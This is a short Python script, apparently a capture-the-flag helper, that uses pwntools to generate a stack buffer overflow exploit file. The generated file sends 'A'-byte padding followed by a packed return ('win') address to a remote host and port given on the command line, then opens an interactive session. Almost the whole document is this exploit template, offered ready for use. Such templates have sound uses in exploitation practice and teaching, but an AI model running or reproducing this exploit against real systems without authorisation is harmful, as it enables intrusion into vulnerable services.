import sys
from pwn import *


def main(host,port,Offset,winaddR):
    
    if winaddR[1] != "x":
        winaddR = "0x"+winaddR
    print(f"Host : {host}\nPort : {port}\nOffset : {Offset}\nWin_Addr : {winaddR}")

    with open("./buffer.py", "w", encoding='utf-8') as f:

        
        f.writelines(f"""from pwn import *

context.log_level='warn'

HOST = ["{host}", "{port}"] # Setting up Host
OFFSET = {Offset}   # Buffer Size
win_addr = {winaddR} # BufferOverflow Address

payload = b''.join([
b'A'*OFFSET,
p32(win_addr),
p32(0x0),
#p32("Addresse to execute the code")
])

print("Payload : ", payload)

p =remote(HOST[0], HOST[1])


# Adapt the rest 
# For exemple : 
# input("gfb") 
# print(p.recvrepeat(.4)) # To print first response from the server
# p.sendline(payload) # To send the payload


p.interactive() 

""")

    print("File 'buffer.py' Created ")



def help():
    print("""
Description:
This tool generates a Python file (buffer.py) for a simple buffer overflow exploit.
You need to modify the communication part with the server according to your needs.

Usage: python3 SBO.py [options] <host> <port> <offset> <win_address>

Options:
  -h, --help     Show this help message and exit
  h, help        Show this help message and exit

Arguments:
  <host>         The IP address of the target host
  <port>         The port number of the target service
  <offset>       The offset for the buffer overflow
  <win_address>  The address to which the buffer overflows

Examples:
  python3 SBO.py 192.168.1.1 1337 64 0xdeadbeef
  python3 SBO.py -h

""")



if __name__ == "__main__":
    host, port, Offset, winaddR = None, None, None, None
    try:
        if sys.argv[1] in ["-h", "--help", "h", "help"]:
            help()
            sys.exit(0)

        host = sys.argv[1]
        port = int(sys.argv[2])
        Offset = int(sys.argv[3])
        winaddR = sys.argv[4]
    except IndexError:
        if host is None:
            host = str(input("Enter IP Host: "))
        if port is None:
            port = int(input("Enter Port: "))
        if Offset is None:
            Offset = int(input("Enter Buffer Size (Offset): "))
        if winaddR is None:
            winaddR = str(input("Enter Buffer Overflow Address: "))

    main(host, port, Offset, winaddR)